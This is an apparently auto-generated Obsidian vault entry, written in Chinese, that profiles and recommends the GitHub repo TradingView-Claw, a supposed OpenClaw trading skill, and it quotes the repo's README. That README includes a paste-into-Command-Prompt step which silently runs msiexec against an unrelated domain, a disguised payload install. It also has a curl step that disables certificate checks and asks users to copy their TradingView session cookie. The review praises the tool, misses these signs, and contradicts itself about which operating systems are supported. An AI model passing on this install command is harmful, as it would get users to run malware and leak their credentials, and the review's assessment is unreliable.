---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 442
stars_per_day: 63
forks: 2
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-12
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "其他"
subcategory: "交易工具"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
score_confidence: 0
score_interest: 0
score_risk: 0
last_reviewed: 2026-03-10
use_case: "提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。"
priority: medium
ring: assess
discovered_via: "GitHub Trending"
appearances: 2
next_review: "2026-03-18"
contributor_count: 1
engagement: "low"
issue_close_rate: -1
repo_size_kb: 102
readme_length: 9243
bus_factor: 1
last_release_days: -1
release_cadence: "never"
verdict: ""
ring_history: "assess@2026-03-10"
star_history: "2026-03-10:332,2026-03-11:332,2026-03-13:407,2026-03-14:442"
tags:
  - github
  - "category/其他"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。"
---

# TradingView-Claw

**442** stars · **63** stars/天 · 建立 7 天前 · Python · MIT

```dataviewjs
const me = dv.page("Repos/helenigtxu--TradingView-Claw");
if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
  const parts = [];
  if (me.my_rating > 0) parts.push("\u2605".repeat(me.my_rating) + "\u2606".repeat(5 - me.my_rating));
  if (me.ring && me.ring !== "assess") parts.push("Ring: **" + me.ring + "**");
  if (me.verdict) parts.push(me.verdict);
  dv.paragraph("> [!success] 你的結論\n> " + parts.join(" / "));
}
```

`個人專案` `easy-install`

`ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` `trading-application` `trading-calculator` `trading-claw` `trading-openclaw` `trading-robots` `trading-ui` `tradingview` `tradingview-claw` `tradingview-openclaw` `tradingview-skill` `tradingview-skill-openclaw` `tradingviewclaw`

> [!summary] 一句話摘要
> 提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (63 stars/day)
> **授權** MIT (商業友好) · **維護** Active (最後推送 1 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
> **適合** 需要在 TradingView 上進行自動化交易的量化交易者和開發者。
> **一句話重點** TradingView-Claw 將自動化交易和即時市場分析結合，提供了一個強大的工具給交易者。

> [!abstract]- 同類競品快速對比
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const rivals = dv.pages('"Repos"')
>     .where(p => p.subcategory === "交易工具" && p.file.name !== "helenigtxu--TradingView-Claw" && p.status !== "archived")
>     .sort(p => p.stars || 0, "desc").limit(5);
>   if (rivals.length > 0) {
>     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
>       p.file.link,
>       (p.stars || 0).toLocaleString(),
>       p.stars_per_day || 0,
>       p.install_complexity || "?",
>       p.license || "?",
>       p.ring || "assess"
>     ]));
>   } else { dv.paragraph("_目前 vault 中沒有其他 交易工具 類工具_"); }
> }
> ```

> [!question] TL;DR — 值得投入嗎？
> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~5h · **綁定風險** medium
> **結論** 花 5 小時學習，3 小時整合，得到即時交易和數據分析的能力，值得投資。

> [!abstract] 核心創新
> 這個專案的創新在於將 TradingView 的市場數據與自動化交易功能整合，提供即時的信號分析和交易執行。

## 專案簡介

TradingView-Claw 是一個針對 OpenClaw 的交易技能，允許用戶透過 TradingView 瀏覽圖表、執行交易並追蹤持倉。用戶可以使用命令如 `tvclaw buy AAPL 500` 來開啟多頭頭寸，並透過 LLM 驅動的技術分析來發現交易信號。這個工具的賣點在於其集成了多個經紀商的 API，提供即時的市場數據和交易執行。它使用 Python 和 Shell 編寫，依賴於 `httpx`、`websockets` 和 `pandas` 等庫來處理資料請求和分析。

相較於其他交易工具，TradingView-Claw 提供了更為直觀的命令行介面，並且能夠即時追蹤持倉和盈虧，這在傳統的交易平台中往往需要多個步驟。使用者只需設置一次 API 金鑰，便可隨時執行交易和檢查帳戶狀態，這對於需要快速反應的交易者來說非常方便。實際使用中，該工具的性能取決於用戶的網絡連接和 API 響應速度，並且需要用戶自行管理 API 金鑰的安全性。這個專案目前處於活躍開發中，適合對自動化交易有興趣的開發者和交易者，特別是那些已經在使用 TradingView 的用戶。

**技術棧**：`Python 3.10` · `httpx` · `websockets` · `pandas`

## 重點功能

- 即時市場數據 — 使用 `tvclaw charts trending` 獲取當前熱門標的的即時數據。
- 交易執行 — 使用 `tvclaw buy` 和 `tvclaw sell` 指令來快速開啟或關閉頭寸。
- 持倉追蹤 — 使用 `tvclaw positions` 指令來查看當前持倉和盈虧狀態。
- 信號發現 — 使用 `tvclaw signal scan` 指令來掃描市場並獲取交易信號，支持多種查詢選項。
- 環境變數配置 — 支持用戶自定義 API 金鑰和會話令牌，確保安全性和靈活性。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
將 TRADINGVIEW_SESSION、BROKER_API_KEY 等添加到 openclaw.json
```
3. 連接經紀商
```bash
uv run python scripts/tvclaw.py account connect
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 建立 7 天就累積 442 stars（63/天），forks 2（0.5%），顯示出穩定的初期增長。作者 helenigtxu 似乎專注於交易相關的開發，這個專案解決了自動化交易中對於 TradingView 數據的需求，之前用戶常常需要手動操作或使用多個工具來達成。這個工具的出現提供了一個更整合的解決方案，讓用戶能夠更有效率地進行交易。社群的反應也顯示出對於這類工具的需求，尤其是在自動化交易日益流行的背景下。

## 適合誰使用

**目標受眾**：需要在 TradingView 上進行自動化交易的量化交易者和開發者。

> [!example] 使用場景
> - 量化交易者用它來自動執行基於技術指標的交易策略，因為它能夠即時分析市場數據並執行交易，提升交易效率。
> - 金融分析師用它來追蹤市場趨勢和持倉狀態，因為它提供了即時的盈虧報告和市場數據分析，幫助做出更明智的決策。
> - 開發者用它來測試和優化交易算法，因為它能夠快速集成多個經紀商的 API，方便進行實驗和調整。

## 架構分析

TradingView-Claw 採用模組化設計，將不同功能分散在多個腳本中，這樣的設計使得功能擴展變得簡單。資料流方面，使用 `httpx` 進行 API 請求，並透過 `websockets` 獲取即時市場數據。這種設計使得用戶能夠在命令行中快速執行交易和查詢，而不需要進入繁瑣的 GUI 界面。選擇 Python 作為開發語言，因為其在數據處理和金融領域的廣泛應用，這也降低了開發的學習曲線。整體架構的擴展性良好，但在高頻交易的情境下可能會受到 API 響應速度的限制。

## 技術深入分析

TradingView-Claw 的核心技術機制是基於 Python 的模組化設計，使用 `httpx` 和 `websockets` 來獲取市場數據和執行交易。這使得系統能夠即時響應市場變化，並提供用戶所需的數據。效能方面，該工具能夠處理多個交易信號的即時分析，但在高頻交易情況下，API 響應速度可能成為瓶頸。選擇 Python 作為開發語言，這不僅降低了開發的複雜度，也使得與其他數據處理庫的整合變得簡單。技術風險方面，對於外部 API 的依賴可能會導致在高流量時出現延遲或錯誤，這需要用戶在使用時保持警覺。整合到現有的 CI/CD pipeline 也相對簡單，因為其命令行介面可以輕鬆地與現有的自動化流程結合。

## 新手體驗

> [!info] 上手難度評估
> README 文件提供了清晰的安裝和使用指導，包含範例命令。安裝過程相對順暢，但需注意環境變數的配置。整體上，對於有一定技術基礎的用戶來說，能在 30 分鐘內完成設置並運行。

## 優缺點分析

> [!success] 優點
> - 集成多個經紀商的 API，方便用戶進行交易。
> - 即時的市場數據和信號分析，提升交易效率。
> - 命令行介面簡單易用，適合快速執行交易。

> [!danger] 缺點
> - 需要用戶自行管理 API 金鑰的安全性，增加了使用風險。
> - 目前僅支援特定操作系統，限制了使用範圍。
> - 對於初學者來說，命令行操作可能有一定的學習曲線。

> [!warning] 注意事項
> - 僅支援 Python 3.10 以上版本。
> - 需要用戶自行管理 API 金鑰的安全性。
> - 不支援 Windows 以外的操作系統安裝，需透過命令行安裝。

## 類似工具比較

| 工具 | 差異 |
| --- | --- |
| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 提供針對 Binance 的交易工具，專注於加密貨幣交易，而 TradingView-Claw 則涵蓋多個經紀商和市場。 |
| [FreedomIntelligence/OpenClaw-Medical-Skills](https://github.com/FreedomIntelligence/OpenClaw-Medical-Skills) | 雖然都是基於 OpenClaw，但專注於醫療領域的技能，TradingView-Claw 專注於金融交易。 |

## 替代方案決策

> [!question] 什麼時候該選別的工具？

| 工具 | 技術路線 | 選它的時機 | 遷移難度 |
| --- | --- | --- | --- |
| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於文件同步，而非交易，適合需要文件管理的用戶。 | 如果你的需求是文件同步而非交易，則應選擇此工具。 | low，因為功能完全不同。 |
| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 提供一個更全面的交易平台，但可能較為複雜。 | 如果需要更全面的交易功能和界面，則選擇此工具。 | medium，因為需要重新學習界面和功能。 |

> [!abstract]- 功能對比矩陣
>
> | 維度 | **TradingView-Claw** | **parsync** | **Shadowbroker** |
> | --- | --- | --- | --- |
> | 技術路線 | 本專案 | 專注於文件同步，而非交易，適合需要文件管理的用戶。 | 提供一個更全面的交易平台，但可能較為複雜。 |
> | 遷移成本 | - | low，因為功能完全不同。 | medium，因為需要重新學習界面和功能。 |
> | 適用場景 | 主要場景 | 如果你的需求是文件同步而非交易，則應選擇此工具。 | 如果需要更全面的交易功能和界面，則選擇此工具。 |

## 成熟度評估

| 項目 | 評估 |
| --- | --- |
| 開發階段 | Alpha |
| 生產環境就緒 | No |
| Breaking Change 風險 | high |

> [!tip] 採用建議
> 適合個人測試和學習，但不建議用於生產環境。

## 已知陷阱

> [!bug] 踩坑才知道的問題

- **[HIGH]** 在某些環境下，安裝過程可能會失敗，特別是 Windows 系統。
  - 解法：建議使用 macOS 或 Linux 環境進行安裝。
- [MEDIUM] API 金鑰配置不當會導致交易失敗。
  - 解法：仔細檢查環境變數的配置，確保所有必要的金鑰都已正確設置。
- [MEDIUM] 信號掃描可能因模型質量不佳而返回空結果。
  - 解法：嘗試使用不同的模型參數或檢查網絡連接。

## 使用情境適合度

| 情境 | 適合度 | 說明 |
| --- | --- | --- |
| 小型交易團隊需要快速執行交易策略 | 非常適合 | 提供即時的市場數據和快速的交易執行。 |
| 個人交易者希望自動化其交易流程 | 適合 | 簡單的命令行介面適合快速上手。 |
| 大型金融機構需要高頻交易解決方案 | 不適合 | 在高頻交易情況下，API 響應速度可能成為瓶頸。 |

## 採用成本分析

| 項目 | 評估 |
| --- | --- |
| 學習時間 | ~5 小時 |
| 整合時間 | ~3 小時 |
| 維護負擔 | medium |
| 綁定風險 | medium |

> [!tip] 投入 vs 回報
> 花 5 小時學習，3 小時整合，得到即時交易和數據分析的能力，值得投資。

## 安全性評估

> [!warning] 安全性快速掃描
> 該工具需要用戶提供 API 金鑰，這可能會帶來安全風險。建議使用子帳戶以限制權限，並保持金鑰的安全性。

## 健康度儀表板

> [!abstract]- 專案健康度綜合評估
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : null;
>   const created = me.created ? new Date(me.created.toString()) : null;
>   const age = created ? Math.floor((Date.now() - created.getTime()) / 86400000) : null;
>   const forkRatio = me.stars > 0 ? ((me.forks || 0) / me.stars * 100).toFixed(1) : 0;
>   const issueRatio = me.stars > 0 ? ((me.open_issues || 0) / me.stars * 100).toFixed(1) : 0;
>   const maint = daysSincePush === null ? "?" : daysSincePush <= 7 ? "Active" : daysSincePush <= 30 ? "Moderate" : "Stale";
>   const busFactor = (me.forks || 0) > 50 ? "Good" : (me.forks || 0) > 10 ? "OK" : "Risk";
>   // v29: README 品質和 Issue 解決率
>   const readmeLen = me.readme_length || 0;
>   const readmeQ = readmeLen > 5000 ? "Excellent" : readmeLen > 2000 ? "Good" : readmeLen > 500 ? "Basic" : readmeLen > 0 ? "Minimal" : "None";
>   const icr = me.issue_close_rate;
>   const icrLabel = icr === undefined || icr < 0 ? "N/A" : icr + "%";
>   const icrEval = icr === undefined || icr < 0 ? "?" : icr >= 80 ? "Excellent" : icr >= 50 ? "Good" : icr >= 20 ? "Fair" : "Poor";
>   const repoKB = me.repo_size_kb || 0;
>   const sizeLabel = repoKB > 102400 ? (repoKB/1024).toFixed(0) + " MB" : repoKB + " KB";
>   dv.table(["指標", "值", "評估"], [
>     ["維護狀態", daysSincePush + " 天前推送", maint],
>     ["專案年齡", age + " 天", age > 180 ? "Established" : age > 30 ? "Growing" : "Brand New"],
>     ["Fork 比率", forkRatio + "%", parseFloat(forkRatio) > 20 ? "High adoption" : parseFloat(forkRatio) > 5 ? "Normal" : "Low"],
>     ["Issue 密度", issueRatio + "%", parseFloat(issueRatio) > 5 ? "High" : "Normal"],
>     ["Issue 解決率", icrLabel, icrEval],
>     ["Bus Factor", (me.bus_factor || 0) + " 人", (me.bus_factor || 0) >= 3 ? "Good" : (me.bus_factor || 0) >= 2 ? "OK" : "Risk"],
>     ["README 品質", readmeLen.toLocaleString() + " 字元", readmeQ],
>     ["Repo 大小", sizeLabel, repoKB > 102400 ? "Large" : repoKB > 10240 ? "Medium" : "Small"],
>     ["發版節奏", me.release_cadence || "unknown", me.release_cadence === "weekly" || me.release_cadence === "monthly" ? "Active" : me.release_cadence === "never" ? "No releases" : "Check"],
>     ["距上次發版", (me.last_release_days || 0) >= 0 ? (me.last_release_days + " 天") : "N/A", (me.last_release_days || -1) < 0 ? "?" : (me.last_release_days || 0) <= 30 ? "Fresh" : (me.last_release_days || 0) <= 90 ? "OK" : "Stale"],
>   ]);
> }
> ```

> [!abstract]- CHAOSS 社群健康度雷達
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const pushed = me.pushed_at ? new Date(me.pushed_at.toString()) : null;
>   const daysSincePush = pushed ? Math.floor((Date.now() - pushed.getTime()) / 86400000) : 999;
>   const dims = [
>     ["維護活躍度", Math.max(0, 5 - Math.floor(daysSincePush / 14))],
>     ["貢獻者多樣性", Math.min(5, Math.floor((me.bus_factor || 0) * 1.5 + (me.contributor_count || 0) / 3))],
>     ["Issue 回應力", (me.issue_close_rate || 0) >= 80 ? 5 : (me.issue_close_rate || 0) >= 50 ? 4 : (me.issue_close_rate || 0) >= 20 ? 2 : 1],
>     ["發版節奏", me.release_cadence === "weekly" ? 5 : me.release_cadence === "monthly" ? 4 : me.release_cadence === "quarterly" ? 3 : me.release_cadence === "irregular" ? 2 : 1],
>     ["社群規模", Math.min(5, Math.floor(Math.log10(Math.max(me.stars || 1, 1)) * 1.2))],
>     ["Fork 活躍度", (me.forks || 0) > 100 ? 5 : (me.forks || 0) > 30 ? 4 : (me.forks || 0) > 10 ? 3 : (me.forks || 0) > 3 ? 2 : 1],
>   ];
>   dv.table(["維度", "分數", "視覺化"], dims.map(([name, score]) => [
>     name, score + "/5", "\u2588".repeat(score) + "\u2591".repeat(5 - score)
>   ]));
>   const avg = (dims.reduce((a, b) => a + b[1], 0) / dims.length).toFixed(1);
>   dv.paragraph("**綜合健康度：" + avg + "/5**");
> }
> ```

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 2 |
| Open Issues | 0 |
| 最後推送 | 2026-03-12 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 102 KB |
| OpenSSF Scorecard | [查看](https://scorecard.dev/viewer/?uri=github.com/helenigtxu/TradingView-Claw) |
| Topics | `ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 5 |

## 社群與生態

**社群活躍度**：社群活躍，最近有更新和提交。
**連結**：[文件](https://github.com/helenigtxu/TradingView-Claw)

## 開發動態

> [!abstract] 最近 10 次 commit（2026-03-06 ~ 2026-03-12）
> **活躍天數** 3 天 · **最新 commit** Update README.md

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on Windows — one command
> 
> ### **Step 1 — Open Command Prompt**
> 1. Press **Win + R**
> 2. Type:
> ```
> cmd
> ```
> 3. Press **Enter**
> This will open **Command Prompt**.
> ---
> ### **Step 2 — Run the Install Command**
> Copy the command below and paste it into **Command Prompt**, then press **Enter**.
> ```powershell
> cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingViewClaw
> ```
> The installer will automatically download and install the required components.
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompts
> 
> Natural language prompts you can use with OpenClaw:
> 
> ### 1. Browse trending charts
> 
> ```
> What's trending on TradingView right now?
> ```
> 
> Returns symbol list, prices, volume, and momentum scores.
> 
> ### 2. Get chart details
> 
> ```
> Show me details for TSLA
> ```
> 
> Returns OHLCV data, RSI, MACD, and support/resistance levels.
> 
> ### 3. Check account status
> 
> ```
> What's my TradingView-Claw account balance?
> ```
> 
> Shows broker connection, buying power, and open positions.
> 
> ### 4. Direct trading
> 
> ```
> Buy $500 of NVDA
> ```
> 
> Executes order via connected broker and records position.
> 
> ### 5. Signal discovery flow
> 
> ```
> Find me strong trading signals right now
> ```
> 
> or more specifically:
> 
> ```
> Run signal scan limit 10
> ```
> 
> > **Note:** This takes a moment. The skill fetches symbols, runs indicator analysis, and sends setups to the LLM for confirmation scoring.
> 
> Review the results — you'll see signal tiers (S1 = 95%+, S2 = 90–95%, S3 = 85–90%) and actionable entry points.
> 
> ### 6. Check positions
> 
> ```
> Show my TradingView-Claw positions
> ```
> 
> Lists open positions with entry price, current price, and P&L.
> 
> ### 7. Close a position
> 
> ```
> Sell my NVDA position
> ```
> 
> Closes your position at current market price.
> 
> ### Full Flow Example
> 
> 1. **"What's trending on TradingView?"** → Get symbol list
> 2. **"Run signal scan limit 10"** → Wait for LLM analysis
> 3. Review signal tiers and setups
> 4. **"Buy $300 of AAPL"** → Enter position
> 5. **"Show my positions"** → Track P&L live
> 
> ---
> 
> ## Environment Variables
> 
> | Variable | Required | Description |
> |---|---|---|
> | `TRADINGVIEW_SESSION` | Yes (data) | TradingView session cookie |
> | `BROKER_API_KEY` | Yes (trading) | Broker/exchange API key |
> | `BROKER_API_SECRET` | Yes (trading) | Broker/exchange API secret |
> | `OPENROUTER_API_KEY` | Yes (signals) | OpenRouter API key for LLM |
> | `HTTPS_PROXY` | No | Use if data requests are rate-limited |
> | `MAX_RETRIES` | No | Max retries for API calls (default: 5) |
> 
> ---
> 
> ## Directory Structure
> 
> ```
> TradingView-Claw/
> ├── SKILL.md                     # OpenClaw skill manifest
> ├── README.md                    # This file
> ├── install.sh                   # macOS one-command installer
> ├── pyproject.toml               # Python dependencies (uv)
> │
> ├── scripts/
> │   ├── tvclaw.py                # CLI dispatcher
> │   ├── charts.py                # Chart & market data
> │   ├── account.py               # Account management
> │   ├── trade.py                 # Order execution
> │   ├── positions.py             # Position tracking + P&L
> │   └── signals.py               # LLM signal discovery
> │
> └── lib/
>     ├── __init__.py              # Package marker
>     ├── tv_client.py             # TradingView data client
>     ├── broker_client.py         # Broker API wrapper
>     ├── indicators.py            # RSI, MACD, Bollinger Bands
>     ├── signal_engine.py         # Signal scoring + tiers
>     ├── llm_client.py            # OpenRouter LLM client
>     └── position_storage.py      # Position JSON storage
> ```
> 
> ---
> 
> ## Trading Flow
> 
> 1. **Connect broker** (one-time): `tvclaw account connect`
> 2. **Execute trade**: `tvclaw buy AAPL 500`
>    * Fetch current price via TradingView data feed
>    * Validate signal strength via indicator suite
>    * Submit order to broker API
>    * Record position to local JSON store
> 3. **Track position**: `tvclaw positions`
> 
> ---
> 
> ## Signal Discovery Flow
> 
> 1. **Scan symbols**: `tvclaw signal scan --query "tech"`
> 2. **Review output**: Table shows Tier, Signal, Entry, Target, Stop
> 3. **Analyze pair**: `tvclaw signal analyze AAPL MSFT`
> 4. **Execute if valid**: Place order based on setup
> 
> **Signal tiers:**
> 
> * **Tier S1 (STRONG):** ≥95% confluence — high-confidence setup
> * **Tier S2 (GOOD):** 90–95% — solid setups
> * **Tier S3 (MODERATE):** 85–90% — acceptable but watch closely

## 延伸閱讀

相關概念：[[量化交易]] · [[技術分析]] · [[自動化交易]]

相關專案：[[binance--binance-skills-hub|binance/binance-skills-hub]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 直接競品（同子分類：交易工具）
> ```dataview
> TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
> FROM "Repos"
> WHERE subcategory = "交易工具" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 同分類的其他專案
> ```dataview
> TABLE stars, install_complexity AS "難度", status
> FROM "Repos"
> WHERE category = "其他" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

> [!note]- 同語言的熱門專案
> ```dataview
> TABLE stars_per_day AS "Stars/天", category AS "分類", use_case AS "用途"
> FROM "Repos"
> WHERE language = "Python" AND file.name != "helenigtxu--TradingView-Claw" AND status != "archived"
> SORT stars_per_day DESC
> LIMIT 5
> ```

> [!note]- 同週收錄
> ```dataview
> TABLE category AS "分類", stars, stars_per_day AS "stars/天"
> FROM "Repos"
> WHERE week = "2026-W11" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

> [!note]- 共用概念的相關專案
> ```dataviewjs
> const concepts = ["量化交易","技術分析","自動化交易"];
> const pages = dv.pages('"Repos"')
>   .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
>   .sort(p => p.stars, "desc")
>   .limit(5);
> if (pages.length > 0) {
>   dv.table(["專案", "Stars", "分類", "共用概念"], pages.map(p => {
>     const shared = concepts.filter(c => p.file.outlinks?.some(l => l.path?.includes(c)));
>     return [p.file.link, p.stars, p.category, shared.join(", ")];
>   }));
> } else { dv.paragraph("_目前沒有共用概念的相關專案_"); }
> ```

> [!note]- Ring 更高的同類競品
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me) {
>   const ringOrder = { hold: 0, assess: 1, trial: 2, adopt: 3 };
>   const myRing = ringOrder[me.ring] || 0;
>   const better = dv.pages('"Repos"')
>     .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.category === me.category && (ringOrder[p.ring] || 0) > myRing)
>     .sort(p => p.stars_per_day || 0, "desc").limit(5);
>   if (better.length > 0) {
>     dv.table(["專案", "Ring", "Stars/天", "安裝", "用途"], better.map(p => [
>       p.file.link, p.ring, p.stars_per_day || 0, p.install_complexity || "?", (p.use_case || "").toString().slice(0, 40)
>     ]));
>   } else { dv.paragraph("_此分類中沒有 Ring 更高的專案（你可能已經在用最好的了）_"); }
> }
> ```

## 同 Owner 專案

> [!note]- 這位開發者的其他收錄專案
> ```dataview
> TABLE stars AS "Stars", category AS "分類", status AS "狀態"
> FROM "Repos"
> WHERE owner = "helenigtxu" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> ```

## Vault 排名

> [!abstract]- 這個專案在 vault 中的相對位置
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> const all = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars_per_day || 0, "desc");
> const rank = all.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const catAll = all.where(p => p.category === me?.category);
> const catRank = catAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> const totalStarsAll = dv.pages('"Repos"').where(p => p.status !== "archived").sort(p => p.stars || 0, "desc");
> const starsRank = totalStarsAll.array().findIndex(p => p.file.name === me?.file?.name) + 1;
> if (rank > 0) {
>   const pct = Math.round((1 - rank / all.length) * 100);
>   dv.paragraph(`Stars/天排名：**全 vault 第 ${rank}**/${all.length}（前 ${100 - pct}%）· **${me.category} 第 ${catRank}**/${catAll.length}\nStars 總量排名：**第 ${starsRank}**/${totalStarsAll.length}`);
> }
> ```

## Star 趨勢

> [!abstract]- Stars 成長追蹤
> ```dataviewjs
> const me = dv.page("Repos/helenigtxu--TradingView-Claw");
> if (me?.star_history) {
>   const raw = me.star_history.toString();
>   const points = raw.split(",").map(p => { const [d, s] = p.split(":"); return { date: d, stars: parseInt(s) }; }).filter(p => !isNaN(p.stars));
>   if (points.length >= 2) {
>     const max = Math.max(...points.map(p => p.stars));
>     const lines = points.map(p => {
>       const w = Math.round(p.stars / max * 25);
>       return `${p.date} ${"\u2588".repeat(w)}${"\u2591".repeat(25-w)} ${p.stars.toLocaleString()}`;
>     });
>     const first = points[0].stars;
>     const last = points[points.length-1].stars;
>     const growth = first > 0 ? Math.round((last - first) / first * 100) : 0;
